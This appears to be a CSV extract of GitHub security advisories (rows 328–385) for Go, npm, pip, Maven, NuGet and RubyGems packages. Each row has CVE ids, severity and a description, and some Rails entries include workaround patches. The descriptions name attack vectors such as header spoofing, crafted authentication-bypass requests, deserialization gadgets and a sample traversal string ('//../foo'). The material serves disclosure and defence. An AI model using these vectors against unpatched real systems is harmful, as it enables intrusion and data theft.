328,24191,nomad,GHSA-cj2h-ww36-v932,CVE-2020-7956,https://github.com/advisories/GHSA-cj2h-ww36-v932,high,2021-05-18 18:20:26 UTC,Improper Certificate Validation in HashiCorp Nomad,"HashiCorp Nomad and Nomad Enterprise up to 0.10.2 incorrectly validated role/region associated with TLS certificates used for mTLS RPC, and were susceptible to privilege escalation. Fixed in 0.10.3.",go
329,22840,gjson,GHSA-w942-gw6m-p62c,CVE-2020-35380,https://github.com/advisories/GHSA-w942-gw6m-p62c,high,2021-06-23 17:53:05 UTC,Denial of service in GJSON,GJSON before 1.6.4 allows attackers to cause a denial of service via crafted JSON.,go
330,22140,gin,GHSA-h395-qcrw-5vmq,CVE-2020-28483,https://github.com/advisories/GHSA-h395-qcrw-5vmq,high,2021-06-23 17:53:21 UTC,Inconsistent Interpretation of HTTP Requests in github.com/gin-gonic/gin,"This affects all versions of package github.com/gin-gonic/gin under 1.7.0. When gin is exposed directly to the internet, a client's IP can be spoofed by setting the X-Forwarded-For header.",go
331,24191,nomad,GHSA-35qp-xq9f-2rjx,CVE-2021-3283,https://github.com/advisories/GHSA-35qp-xq9f-2rjx,high,2021-06-24 20:28:28 UTC,Improper Privilege Management in HashiCorp Nomad,"HashiCorp Nomad and Nomad Enterprise up to 0.12.9 exec and java task drivers can access processes associated with other tasks on the same node. Fixed in 0.12.10, and 1.0.3.",go
332,20473,markdown2,GHSA-jr9p-r423-9m2r,CVE-2021-26813,https://github.com/advisories/GHSA-jr9p-r423-9m2r,high,2021-06-02 21:44:28 UTC,Vulnerability in markdown2,"markdown2 >=1.0.1.18, fixed in 2.4.0, is affected by a regular expression denial of service vulnerability. If an attacker provides a malicious string, it can make markdown2 processing difficult or delayed for an extended period of time.",pip
333,33676,eth,GHSA-qr2j-wrhx-4829,CVE-2018-16733,https://github.com/advisories/GHSA-qr2j-wrhx-4829,moderate,2021-05-18 18:38:06 UTC,Improper Input Validation,"In Go Ethereum (aka geth) before 1.8.14, TraceChain in eth/api_tracer.go does not verify that the end block is after the start block.",go
334,23143,go-jose.v1,GHSA-77gc-fj98-665h,CVE-2016-9122,https://github.com/advisories/GHSA-77gc-fj98-665h,high,2021-05-18 19:15:09 UTC,Signature Validation Bypass,"Go JOSE before 1.1.0 suffers from multiple signatures exploitation. The go-jose library supports messages with multiple signatures. However, when validating a signed message the API did not indicate which signature was valid, which could potentially lead to confusion. For example, users of the library might mistakenly read protected header values from an attached signature that was different from the one originally validated.",go
335,22699,unicode,GHSA-5rcv-m4m3-hfh7,CVE-2020-14040,https://github.com/advisories/GHSA-5rcv-m4m3-hfh7,high,2021-05-18 18:34:35 UTC,Infinite Loop in Go,"Go version v0.3.3 of the x/text package fixes a vulnerability in encoding/unicode that could lead to the UTF-16 decoder entering an infinite loop, causing the program to crash or run out of memory. An attacker could provide a single byte to a UTF16 decoder instantiated with UseBOM or ExpectBOM to trigger an infinite loop if the String function on the Decoder is called, or the Decoder is passed to golang.org/x/text/transform.String.",go
336,18453,mversion,GHSA-6m8p-4fxj-pgc2,CVE-2020-7688,https://github.com/advisories/GHSA-6m8p-4fxj-pgc2,moderate,2021-05-17 21:01:08 UTC,OS Command Injection in mversion,The issue occurs because tagName user input is formatted inside the exec function is executed without any checks.,npm
337,12878,Microsoft.AspNetCore.Mvc,GHSA-6xh7-4v2w-36q6,CVE-2017-0247,https://github.com/advisories/GHSA-6xh7-4v2w-36q6,high,2018-10-16 19:58:05 UTC,ASP.NET Core fails to properly validate web requests,A denial of service vulnerability exists when the ASP.NET Core fails to properly validate web requests. NOTE: Microsoft has not commented on third-party claims that the issue is that the TextEncoder.EncodeCore function in the System.Text.Encodings.Web package in ASP.NET Core Mvc before 1.0.4 and 1.1.x before 1.1.3 allows remote attackers to cause a denial of service by leveraging failure to properly calculate the length of 4-byte characters in the Unicode Non-Character range.,nuget
338,33935,org.eclipse.jetty:jetty-server,GHSA-x3rh-m7vp-35f2,CVE-2019-17638,https://github.com/advisories/GHSA-x3rh-m7vp-35f2,critical,2020-08-05 14:52:59 UTC,Operation on a Resource after Expiration or Release in Jetty Server,"In Eclipse Jetty, versions 9.4.27.v20200227 to 9.4.29.v20200521, in case of too large response headers, Jetty throws an exception to produce an HTTP 431 error. When this happens, the ByteBuffer containing the HTTP response headers is released back to the ByteBufferPool twice. Because of this double release, two threads can acquire the same ByteBuffer from the pool and while thread1 is about to use the ByteBuffer to write response1 data, thread2 fills the ByteBuffer with response2 data. Thread1 then proceeds to write the buffer that now contains response2 data. This results in client1, which issued request1 and expects responses, to see response2 which could contain sensitive data belonging to client2 (HTTP session ids, authentication credentials, etc.).",maven
339,22171,dns,GHSA-9jcx-pr2f-qvq5,CVE-2018-17419,https://github.com/advisories/GHSA-9jcx-pr2f-qvq5,high,2021-05-18 18:34:25 UTC,Denial of Service (DoS),"An issue was discovered in setTA in scan_rr.go in the Miek Gieben DNS library before 1.0.10 for Go. A dns.ParseZone() parsing error causes a segmentation violation, leading to denial of service.",go
340,17471,rollup-plugin-serve,GHSA-4j46-mp85-mv8c,CVE-2020-7684,https://github.com/advisories/GHSA-4j46-mp85-mv8c,critical,2021-05-18 01:52:24 UTC,Path traversal in rollup-plugin-serve,Path traversal in npm package `rollup-plugin-serve` before version 1.0.2. There is no path sanitization in `readFile` operation.,npm
341,34228,org.springframework.security:spring-security-web,GHSA-gq28-h5vg-8prx,CVE-2021-22112,https://github.com/advisories/GHSA-gq28-h5vg-8prx,high,2021-05-10 15:22:39 UTC,Privilege escalation in spring security,"Spring Security 5.4.x prior to 5.4.4, 5.3.x prior to 5.3.8.RELEASE, 5.2.x prior to 5.2.9.RELEASE, and older unsupported versions can fail to save the SecurityContext if it is changed more than once in a single request.A malicious user cannot cause the bug to happen (it must be programmed in). However, if the application's intent is to only allow the user to run with elevated privileges in a small portion of the application, the bug can be leveraged to extend those privileges to the rest of the application.",maven
342,20810,apache-airflow,GHSA-fh37-cx83-q542,CVE-2021-26697,https://github.com/advisories/GHSA-fh37-cx83-q542,moderate,2021-06-18 18:30:11 UTC,Improper Authentication in Apache Airflow,The lineage endpoint of the deprecated Experimental API was not protected by authentication in Airflow 2.0.0. This allowed unauthenticated users to hit that endpoint. This is low-severity issue as the attacker needs to be aware of certain parameters to pass to that endpoint and even after can just get some metadata about a DAG and a Task. This issue only affects Apache Airflow 2.0.0.,pip
343,17002,quill,GHSA-4943-9vgg-gr5r,CVE-2021-3163,https://github.com/advisories/GHSA-4943-9vgg-gr5r,moderate,2021-05-10 15:38:12 UTC,Cross-site Scripting in quill,"A vulnerability in the HTML editor of Slab Quill allows an attacker to execute arbitrary JavaScript by storing an XSS payload (a crafted `onloadstart` attribute of an IMG element) in a text field. No patch exists and no further releases are planned.

This CVE is disputed. Researchers have claimed that this issue is not within the product itself, but is intended behavior in a web browser. More information can be found [here](https://github.com/quilljs/quill/issues/3364).",npm
344,18382,hosted-git-info,GHSA-43f8-2h32-f4cj,CVE-2021-23362,https://github.com/advisories/GHSA-43f8-2h32-f4cj,moderate,2021-05-06 16:10:39 UTC,Regular Expression Denial of Service in hosted-git-info,The npm package `hosted-git-info` before 3.0.8 are vulnerable to Regular Expression Denial of Service (ReDoS) via regular expression shortcutMatch in the fromUrl function in index.js. The affected regular expression exhibits polynomial worst-case time complexity,npm
345,17656,swiper,GHSA-p3hc-fv2j-rp68,CVE-2021-23370,https://github.com/advisories/GHSA-p3hc-fv2j-rp68,critical,2021-05-10 15:36:30 UTC,Prototype Pollution in swiper,Versions of the package swiper before 6.5.1 are susceptible to prototype pollution.,npm
346,34577,org.apache.solr:solr-core,GHSA-jgcr-fg3g-qvw8,CVE-2021-29262,https://github.com/advisories/GHSA-jgcr-fg3g-qvw8,high,2021-05-10 15:18:17 UTC,Improper permission handling in Apache Solr,"When starting Apache Solr versions prior to 8.8.2, configured with the SaslZkACLProvider or VMParamsAllAndReadonlyDigestZkACLProvider and no existing security.json znode, if the optional read-only user is configured then Solr would not treat that node as a sensitive path and would allow it to be readable. Additionally, with any ZkACLProvider, if the security.json is already present, Solr will not automatically update the ACLs.",maven
347,20017,eventlet,GHSA-9p9m-jm8w-94p2,CVE-2021-21419,https://github.com/advisories/GHSA-9p9m-jm8w-94p2,moderate,2021-05-07 15:50:36 UTC,Improper Handling of Highly Compressed Data (Data Amplification) and Memory Allocation with Excessive Size Value in eventlet,"### Impact
A websocket peer may exhaust memory on Eventlet side by sending very large websocket frames. Malicious peer may exhaust memory on Eventlet side by sending highly compressed data frame.

### Patches
Version 0.31.0 restricts websocket frame to reasonable limits.

### Workarounds
Restricting memory usage via OS limits would help against overall machine exhaustion. No workaround to protect Eventlet process.

### For more information
If you have any questions or comments about this advisory:
* Open an issue in [eventlet](https://github.com/eventlet/eventlet/issues)
* Contact current maintainers. At 2021-03: temotor@gmail.com or https://t.me/temotor",pip
348,17380,bson,GHSA-v8w9-2789-6hhr,CVE-2020-7610,https://github.com/advisories/GHSA-v8w9-2789-6hhr,high,2021-05-07 16:04:54 UTC,Deserialization of Untrusted Data in bson,"All versions of bson before 1.1.4 are vulnerable to Deserialization of Untrusted Data. The package will ignore an unknown value for an object's _bsotype, leading to cases where an object is serialized as a document rather than the intended BSON type.",npm
349,16664,canvas,GHSA-73rg-x683-m3qw,CVE-2020-8215,https://github.com/advisories/GHSA-73rg-x683-m3qw,high,2021-05-07 16:05:16 UTC,Buffer overflow  in canvas,"A buffer overflow is present in canvas versions before 1.6.11, which could lead to a Denial of Service or execution of arbitrary code when it processes a user-provided image.",npm
350,34422,org.apache.shiro:shiro-core,GHSA-72w9-fcj5-3fcg,CVE-2020-11989,https://github.com/advisories/GHSA-72w9-fcj5-3fcg,critical,2021-05-07 15:53:10 UTC,Improper Authentication in Apache Shiro,"Apache Shiro is a powerful and easy-to-use Java security framework that performs authentication, authorization, cryptography, and session management. Apache Shiro before 1.5.3, when using Apache Shiro with Spring dynamic controllers, a specially crafted request may cause an authentication bypass.",maven
351,34422,org.apache.shiro:shiro-core,GHSA-26gr-cvq3-qxgf,CVE-2020-1957,https://github.com/advisories/GHSA-26gr-cvq3-qxgf,critical,2021-05-07 15:53:18 UTC,Improper Authentication in Apache Shiro,"Apache Shiro before 1.5.2, when using Apache Shiro with Spring dynamic controllers, a specially crafted request may cause an authentication bypass.",maven
352,17681,highcharts,GHSA-8j65-4pcq-xq95,CVE-2021-29489,https://github.com/advisories/GHSA-8j65-4pcq-xq95,high,2021-05-06 15:45:03 UTC,Options structure open to Cross-site Scripting if passed unfiltered,"### Impact
In Highcharts versions 8 and earlier, the chart options structure was not systematically filtered for XSS vectors. The potential impact was that content from untrusted sources could execute code in the end user's browser. Especially when using the `useHTML` flag, HTML string options would be inserted unfiltered directly into the DOM. When `useHTML` was false, malicious code could be inserted by using various character replacement tricks or malformed HTML.

If your chart configuration comes from a trusted source like a static setup or pre-filtered HTML (or no markup at all in the configuration), you are not impacted.

### Patches
In version 9, the whole rendering layer was refactored to use an DOMParser, an AST and tag and HTML allow-listing to make sure only safe content entered the DOM. In addition, prototype pollution was stopped.

### Workarounds
Implementers who are not able to upgrade may apply [DOMPurify](https://github.com/cure53/DOMPurify) recursively [to the options structure](https://jsfiddle.net/highcharts/zd3wcm5L/) to filter out malicious markup.

### References
* Details on the improved [Highcharts security](https://www.highcharts.com/docs/chart-concepts/security)
* [The AST and TextBuilder refactoring](https://github.com/highcharts/highcharts/pull/14913)
* [The fix for prototype pollution](https://github.com/highcharts/highcharts/pull/14884)

### For more information
If you have any questions or comments about this advisory:
* Visit our [support page](https://www.highcharts.com/blog/support/)
* For more Email us at [security@highcharts.com](mailto:security@highcharts.com)
",npm
353,20810,apache-airflow,GHSA-86vp-x3pr-79rx,CVE-2020-17515,https://github.com/advisories/GHSA-86vp-x3pr-79rx,moderate,2021-04-20 16:40:14 UTC,Apache Airflow Cross-site scripting due to incomplete fix for CVE-2020-13944,The `origin` parameter passed to some of the endpoints like `/trigger` was vulnerable to XSS exploit. This issue affects Apache Airflow versions prior to 1.10.14. This is same as CVE-2020-13944 but the implemented fix in Airflow 1.10.13 did not fix the issue completely.,pip
354,34528,org.apache.wicket:wicket-core,GHSA-64gv-3pqv-299h,CVE-2020-11976,https://github.com/advisories/GHSA-64gv-3pqv-299h,high,2021-05-07 15:54:15 UTC,Exposure of Sensitive Information to an Unauthorized Actor in Apache Wicket,"By crafting a special URL it is possible to make Wicket deliver unprocessed HTML templates. This would allow an attacker to see possibly sensitive information inside a HTML template that is usually removed during rendering. Affected are Apache Wicket versions 7.16.0, 8.8.0 and 9.0.0-M5",maven
355,18135,tinymce,GHSA-p7j5-4mwm-hv86,CVE-2020-17480,https://github.com/advisories/GHSA-p7j5-4mwm-hv86,moderate,2021-05-06 17:28:14 UTC,Cross-site scripting in TinyMCE,"TinyMCE before 4.9.7 and 5.x before 5.1.4 allows XSS in the core parser, the paste plugin, and the visualchars plugin by using the clipboard or APIs to insert content into the editor.",npm
356,34422,org.apache.shiro:shiro-core,GHSA-2vgm-wxr3-6w2j,CVE-2020-13933,https://github.com/advisories/GHSA-2vgm-wxr3-6w2j,high,2021-05-07 15:54:23 UTC,Authentication bypass in Apache Shiro,"Apache Shiro before 1.6.0, when using Apache Shiro, a specially crafted HTTP request may cause an authentication bypass.",maven
357,18865,actionpack,GHSA-7wjx-3g7j-8584,CVE-2021-22904,https://github.com/advisories/GHSA-7wjx-3g7j-8584,high,2021-05-05 19:49:12 UTC,Denial of Service in Action Controller Token Authentication,"Impact
------
Impacted code uses `authenticate_or_request_with_http_token` or
`authenticate_with_http_token` for request authentication.  Impacted code will
look something like this:

```
class PostsController < ApplicationController
  before_action :authenticate

  private

  def authenticate
    authenticate_or_request_with_http_token do |token, options|
      # ...
    end
  end
end
```

All users running an affected release should either upgrade or use one of the
workarounds immediately.

Releases
--------
The fixed releases are available at the normal locations.

Workarounds
-----------
The following monkey patch placed in an initializer can be used to work around
the issue:

```ruby
module ActionController::HttpAuthentication::Token
  AUTHN_PAIR_DELIMITERS = /(?:,|;|\t)/
end
```

Patches
-------
To aid users who aren't able to upgrade immediately we have provided patches for
the two supported release series. They are in git-am format and consist of a
single changeset.

* 5-2-http-authentication-dos.patch - Patch for 5.2 series
* 6-0-http-authentication-dos.patch - Patch for 6.0 series
* 6-1-http-authentication-dos.patch - Patch for 6.1 series

Please note that only the 6.1.Z, 6.0.Z, and 5.2.Z series are supported at
present. Users of earlier unsupported releases are advised to upgrade as soon
as possible as we cannot guarantee the continued availability of security
fixes for unsupported releases.

Credits
-------
Thank you to https://hackerone.com/wonda_tea_coffee for reporting this issue!",rubygems
358,18865,actionpack,GHSA-hjg4-8q5f-x6fm,CVE-2021-22885,https://github.com/advisories/GHSA-hjg4-8q5f-x6fm,high,2021-05-05 19:49:02 UTC,Information Disclosure / Unintended Method Execution in Action Pack,"Impact
------
There is a possible information disclosure / unintended method execution
vulnerability in Action Pack when using the `redirect_to` or `polymorphic_url`
helper with untrusted user input.

Vulnerable code will look like this.

```
redirect_to(params[:some_param])
```

All users running an affected release should either upgrade or use one of the
workarounds immediately.

Releases
--------
The FIXED releases are available at the normal locations.

Workarounds
-----------
To work around this problem, it is recommended to use an allow list for valid
parameters passed from the user.  For example,

```
private def check(param)
  case param
  when ""valid""
    param
  else
    ""/""
  end
end

def index
  redirect_to(check(params[:some_param]))
end
```

Or force the user input to be cast to a string like this,

```
def index
  redirect_to(params[:some_param].to_s)
end
```

Patches
-------
To aid users who aren't able to upgrade immediately we have provided patches for
the two supported release series. They are in git-am format and consist of a
single changeset.

* 5-2-information-disclosure.patch - Patch for 5.2 series
* 6-0-information-disclosure.patch - Patch for 6.0 series
* 6-1-information-disclosure.patch - Patch for 6.1 series

Please note that only the 5.2, 6.0, and 6.1 series are supported at present. Users
of earlier unsupported releases are advised to upgrade as soon as possible as we
cannot guarantee the continued availability of security fixes for unsupported
releases.

Credits
-------

Thanks to Benoit Côté-Jodoin from Shopify for reporting this.",rubygems
359,18865,actionpack,GHSA-5hq2-xf89-9jxq,CVE-2021-22903,https://github.com/advisories/GHSA-5hq2-xf89-9jxq,moderate,2021-05-05 19:48:29 UTC,Open Redirect in Action Pack,"Impact
------
This is similar to CVE-2021-22881. Specially crafted Host headers in
combination with certain ""allowed host"" formats can cause the Host
Authorization middleware in Action Pack to redirect users to a malicious
website.

Since rails/rails@9bc7ea5, strings in config.hosts that do not have a leading
dot are converted to regular expressions without proper escaping. This causes,
for example, config.hosts << ""sub.example.com"" to permit a request with a Host
header value of sub-example.com.


Releases
--------
The fixed releases are available at the normal locations.

Workarounds
-----------
The following monkey patch put in an initializer can be used as a workaround.

```ruby
class ActionDispatch::HostAuthorization::Permissions
  def sanitize_string(host)
    if host.start_with?(""."")
      /\A(.+\.)?#{Regexp.escape(host[1..-1])}\z/i
    else
      /\A#{Regexp.escape host}\z/i
    end
  end
end
```

Patches
-------
To aid users who aren't able to upgrade immediately we have provided patches for
the two supported release series. They are in git-am format and consist of a
single changeset.

* 6-1-open-redirect.patch - Patch for 6.1 series

Please note that only the 6.1.Z, 6.0.Z, and 5.2.Z series are supported at
present. Users of earlier unsupported releases are advised to upgrade as soon
as possible as we cannot guarantee the continued availability of security
fixes for unsupported releases.

Credits
-------

Thanks Jonathan Hefner (https://hackerone.com/jonathanhefner) for reporting this bug!",rubygems
360,18865,actionpack,GHSA-g8ww-46x2-2p65,CVE-2021-22902,https://github.com/advisories/GHSA-g8ww-46x2-2p65,high,2021-05-05 19:48:21 UTC,Denial of Service in Action Dispatch,"Impact
------
There is a possible Denial of Service vulnerability in Action Dispatch.
Carefully crafted Accept headers can cause the mime type parser in Action
Dispatch to do catastrophic backtracking in the regular expression engine.

Releases
--------
The fixed releases are available at the normal locations.

Workarounds
-----------
The following monkey patch placed in an initializer can be used to work around
the issue.

```ruby
module Mime
  class Type
    MIME_REGEXP = /\A(?:\*\/\*|#{MIME_NAME}\/(?:\*|#{MIME_NAME})(?>\s*#{MIME_PARAMETER}\s*)*)\z/
  end
end
```

Patches
-------
To aid users who aren't able to upgrade immediately we have provided patches for
the two supported release series. They are in git-am format and consist of a
single changeset.

* 6-0-Prevent-catastrophic-backtracking-during-mime-parsin.patch - Patch for 6.0 series
* 6-1-Prevent-catastrophic-backtracking-during-mime-parsin.patch - Patch for 6.1 series

Please note that only the 6.1.Z, 6.0.Z, and 5.2.Z series are supported at
present. Users of earlier unsupported releases are advised to upgrade as soon
as possible as we cannot guarantee the continued availability of security
fixes for unsupported releases.

Credits
-------

Thanks to Security Curious <security...@pm.me> for reporting this!",rubygems
361,17859,json,GHSA-3c6g-pvg8-gqw2,CVE-2020-7712,https://github.com/advisories/GHSA-3c6g-pvg8-gqw2,high,2021-05-06 18:11:21 UTC,Command injection in json,This affects the package json before 10.0.0. It is possible to inject arbritary commands using the parseLookup function.,npm
362,19977,Flask-Cors,GHSA-xc3p-ff3m-f46v,CVE-2020-25032,https://github.com/advisories/GHSA-xc3p-ff3m-f46v,high,2021-05-06 18:51:48 UTC,Insecure input handling in Flask-Cors,An issue was discovered in Flask-CORS (aka CORS Middleware for Flask) before 3.0.9. It allows ../ directory traversal to access private resources because resource matching does not ensure that pathnames are in a canonical format.,pip
363,34418,org.apache.cassandra:cassandra-all,GHSA-24ww-mc5x-xc43,CVE-2020-13946,https://github.com/advisories/GHSA-24ww-mc5x-xc43,moderate,2021-05-07 15:54:46 UTC,Man-in-the-middle attack in Apache Cassandra,"In Apache Cassandra, all versions prior to 2.1.22, 2.2.18, 3.0.22, 3.11.8 and 4.0-beta2, it is possible for a local attacker without access to the Apache Cassandra process or configuration files to manipulate the RMI registry to perform a man-in-the-middle attack and capture user names and passwords used to access the JMX interface. The attacker can then use these credentials to access the JMX interface and perform unauthorised operations. Users should also be aware of CVE-2019-2684, a JRE vulnerability that enables this issue to be exploited remotely.",maven
364,15835,grunt,GHSA-m5pj-vjjf-4m3h,CVE-2020-7729,https://github.com/advisories/GHSA-m5pj-vjjf-4m3h,high,2021-05-06 18:27:18 UTC,Arbitrary Code Execution in grunt,The package grunt before 1.3.0 are vulnerable to Arbitrary Code Execution due to the default usage of the function load() instead of its secure replacement safeLoad() of the package js-yaml inside grunt.file.readYAML.,npm
365,19919,pip,GHSA-gpvv-69j7-gwj8,CVE-2019-20916,https://github.com/advisories/GHSA-gpvv-69j7-gwj8,high,2021-06-09 17:35:04 UTC,Path Traversal in pip,"The pip package before 19.2 for Python allows Directory Traversal when a URL is given in an install command, because a Content-Disposition header can have ../ in a filename, as demonstrated by overwriting the /root/.ssh/authorized_keys file. This occurs in _download_http_url in _internal/download.py. A fix was committed 6704f2ace.",pip
366,18813,bundler,GHSA-g98m-96g9-wfjq,CVE-2019-3881,https://github.com/advisories/GHSA-g98m-96g9-wfjq,high,2021-05-10 14:53:59 UTC,Insecure path handling in Bundler,"Bundler prior to 2.1.0 uses a predictable path in /tmp/, created with insecure permissions as a storage location for gems, if locations under the user's home directory are not available. If Bundler is used in a scenario where the user does not have a writable home directory, an attacker could place malicious code in this directory that would be later loaded and executed.",rubygems
367,13397,UmbracoCms,GHSA-j66f-h9hm-975m,CVE-2020-9472,https://github.com/advisories/GHSA-j66f-h9hm-975m,moderate,2021-08-02 17:38:56 UTC,Unrestricted Upload of File with Dangerous Type in Umbraco CMS,Umbraco CMS 8.5.3 allows an authenticated file upload (and consequently Remote Code Execution) via the Install Package functionality.,nuget
368,17510,ua-parser-js,GHSA-662x-fhqg-9p8v,CVE-2020-7733,https://github.com/advisories/GHSA-662x-fhqg-9p8v,high,2021-05-07 16:18:19 UTC,Regular Expression Denial of Service in ua-parser-js,The package ua-parser-js before 0.7.22 are vulnerable to Regular Expression Denial of Service (ReDoS) via the regex for Redmi Phones and Mi Pad Tablets UA.,npm
369,20810,apache-airflow,GHSA-4pwq-fj89-6rjc,CVE-2020-13944,https://github.com/advisories/GHSA-4pwq-fj89-6rjc,moderate,2021-06-18 18:29:54 UTC,Apache Airflow Cross-site Scripting,"In Apache Airflow < 1.10.12, the `origin` parameter passed to some of the endpoints like `/trigger` and was vulnerable to a XSS exploit.",pip
370,35085,org.bouncycastle:bcprov-jdk15,GHSA-73xv-w5gp-frxh,CVE-2020-28052,https://github.com/advisories/GHSA-73xv-w5gp-frxh,high,2021-04-30 16:14:15 UTC,Logic error in Legion of the Bouncy Castle BC Java,"An issue was discovered in Legion of the Bouncy Castle BC Java 1.65 and 1.66. The OpenBSDBCrypt.checkPassword utility method compared incorrect data when checking the password, allowing incorrect passwords to indicate they were matching with previously hashed ones that were different.",maven
371,17171,typeorm,GHSA-pf2j-9qmp-jqr2,CVE-2020-8158,https://github.com/advisories/GHSA-pf2j-9qmp-jqr2,critical,2021-05-07 16:46:42 UTC,TypeORM vulnerable to MAID and Prototype Pollution,Prototype pollution vulnerability in the TypeORM package < 0.2.25 may allow attackers to add or modify Object properties leading to further denial of service or SQL injection attacks.,npm
372,27045,gon,GHSA-78vq-9j56-wrfr,CVE-2020-25739,https://github.com/advisories/GHSA-78vq-9j56-wrfr,moderate,2021-04-30 17:29:15 UTC,Cross-site Scripting in gon,"An issue was discovered in the gon gem before gon-6.4.0 for Ruby. MultiJson does not honor the escape_mode parameter to escape fields as an XSS protection mechanism. To mitigate, json_dumper.rb in gon now does escaping for XSS by default without relying on MultiJson.",rubygems
373,16114,ng-packagr,GHSA-qm28-7hqv-wg5j,CVE-2020-7735,https://github.com/advisories/GHSA-qm28-7hqv-wg5j,moderate,2021-05-07 16:47:32 UTC,OS Command Injection in ng-packagr,The package ng-packagr before 10.1.1 are vulnerable to Command Injection via the styleIncludePaths option.,npm
374,34025,org.springframework.security:spring-security-core,GHSA-v33x-prhc-gph5,CVE-2019-11272,https://github.com/advisories/GHSA-v33x-prhc-gph5,high,2019-06-27 17:24:58 UTC,Insufficiently Protected Credentials and Improper Authentication in Spring Security,"Spring Security, versions 4.2.x up to 4.2.12, and older unsupported versions support plain text passwords using PlaintextPasswordEncoder. If an application using an affected version of Spring Security is leveraging PlaintextPasswordEncoder and a user has a null encoded password, a malicious user (or attacker) can authenticate using a password of ?null?.",maven
375,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-6fpp-rgj9-8rwc,CVE-2019-14379,https://github.com/advisories/GHSA-6fpp-rgj9-8rwc,critical,2019-08-01 19:18:00 UTC,Deserialization of untrusted data in FasterXML jackson-databind,"SubTypeValidator.java in FasterXML jackson-databind before 2.9.9.2 mishandles default typing when ehcache is used (because of net.sf.ehcache.transaction.manager.DefaultTransactionManagerLookup), leading to remote code execution.",maven
376,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-mx7p-6679-8g3q,CVE-2019-16942,https://github.com/advisories/GHSA-mx7p-6679-8g3q,critical,2019-10-28 20:51:15 UTC,Polymorphic Typing in FasterXML jackson-databind,"A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.0.0 through 2.9.10. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has the commons-dbcp (1.4) jar in the classpath, and an attacker can find an RMI service endpoint to access, it is possible to make the service execute a malicious payload. This issue exists because of org.apache.commons.dbcp.datasources.SharedPoolDataSource and org.apache.commons.dbcp.datasources.PerUserPoolDataSource mishandling.",maven
377,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-fmmc-742q-jg75,CVE-2019-16943,https://github.com/advisories/GHSA-fmmc-742q-jg75,critical,2019-11-13 00:32:27 UTC,Polymorphic typing issue,"A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.0.0 through 2.9.10. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has the p6spy (3.8.6) jar in the classpath, and an attacker can find an RMI service endpoint to access, it is possible to make the service execute a malicious payload. This issue exists because of com.p6spy.engine.spy.P6DataSource mishandling.",maven
378,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-gjmw-vf9h-g25v,CVE-2019-17531,https://github.com/advisories/GHSA-gjmw-vf9h-g25v,critical,2019-11-13 00:32:38 UTC,Polymorphic typing issue,"A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.0.0 through 2.9.10. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has the apache-log4j-extra (version 1.2.x) jar in the classpath, and an attacker can provide a JNDI service to access, it is possible to make the service execute a malicious payload. ",maven
379,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-qr7j-h6gg-jmgc,CVE-2018-11307,https://github.com/advisories/GHSA-qr7j-h6gg-jmgc,critical,2019-07-16 17:42:21 UTC,Deserialization of Untrusted Data in jackson-databind,"An issue was discovered in FasterXML jackson-databind 2.0.0 through 2.9.5. Use of Jackson default typing along with a gadget class from iBatis allows exfiltration of content. Fixed in 2.7.9.4, 2.8.11.2, and 2.9.6.",maven
380,34016,com.thoughtworks.xstream:xstream,GHSA-hf23-9pf7-388p,CVE-2019-10173,https://github.com/advisories/GHSA-hf23-9pf7-388p,critical,2019-07-26 16:09:47 UTC,Deserialization of Untrusted Data and Code Injection in xstream,"It was found that xstream API version 1.4.10 before 1.4.11 introduced a regression for a previous deserialization flaw. If the security framework has not been initialized, it may allow a remote attacker to run arbitrary shell commands when unmarshalling XML or any supported format. e.g. JSON. (regression of CVE-2013-7285) ",maven
381,33874,commons-io:commons-io,GHSA-gwrp-pvrq-jmwv,CVE-2021-29425,https://github.com/advisories/GHSA-gwrp-pvrq-jmwv,moderate,2021-04-26 16:04:00 UTC,Path Traversal and Improper Input Validation in Apache Commons IO,"In Apache Commons IO before 2.7, When invoking the method FileNameUtils.normalize with an improper input string, like ""//../foo"", or ""\\..\foo"", the result would be the same value, thus possibly providing access to files in the parent directory, but not further above (thus ""limited"" path traversal), if the calling code would use the result to construct a path value.",maven
382,33935,org.eclipse.jetty:jetty-server,GHSA-7vx9-xjhr-rw6h,CVE-2019-10241,https://github.com/advisories/GHSA-7vx9-xjhr-rw6h,moderate,2019-04-23 16:06:02 UTC,Cross-site Scripting in Eclipse Jetty,"In Eclipse Jetty version 9.2.26 and older, 9.3.25 and older, and 9.4.15 and older, the server is vulnerable to XSS conditions if a remote client USES a specially formatted URL against the DefaultServlet or ResourceHandler that is configured for showing a Listing of directory contents.",maven
383,33935,org.eclipse.jetty:jetty-server,GHSA-r28m-g6j9-r2h5,CVE-2019-10246,https://github.com/advisories/GHSA-r28m-g6j9-r2h5,moderate,2019-04-23 16:07:18 UTC,Information Exposure vulnerability in Eclipse Jetty,"In Eclipse Jetty version 9.2.27, 9.3.26, and 9.4.16, the server running on Windows is vulnerable to exposure of the fully qualified Base Resource directory name on Windows to a remote client when it is configured for showing a Listing of directory contents. This information reveal is restricted to only the content in the configured base resource directories.",maven
384,33935,org.eclipse.jetty:jetty-server,GHSA-xc67-hjx6-cgg6,CVE-2019-10247,https://github.com/advisories/GHSA-xc67-hjx6-cgg6,moderate,2019-04-23 16:07:12 UTC,Installation information leak in Eclipse Jetty,"In Eclipse Jetty version 7.x, 8.x, 9.2.27 and older, 9.3.26 and older, and 9.4.16 and older, the server running on any OS and Jetty version combination will reveal the configured fully qualified directory base resource location on the output of the 404 error for not finding a Context that matches the requested path. The default server behavior on jetty-distribution and jetty-home will include at the end of the Handler tree a DefaultHandler, which is responsible for reporting this 404 error, it presents the various configured contexts as HTML for users to click through to. This produced HTML includes output that contains the configured fully qualified directory base resource location for each context.",maven
385,33879,com.fasterxml.jackson.core:jackson-databind,GHSA-mph4-vhrx-mv67,CVE-2019-12384,https://github.com/advisories/GHSA-mph4-vhrx-mv67,moderate,2019-07-05 21:07:27 UTC,Deserialization of Untrusted Data in FasterXML jackson-databind,"FasterXML jackson-databind 2.x before 2.9.9.1 might allow attackers to have a variety of impacts by leveraging failure to block the logback-core class from polymorphic deserialization. Depending on the classpath content, remote code execution may be possible.",maven
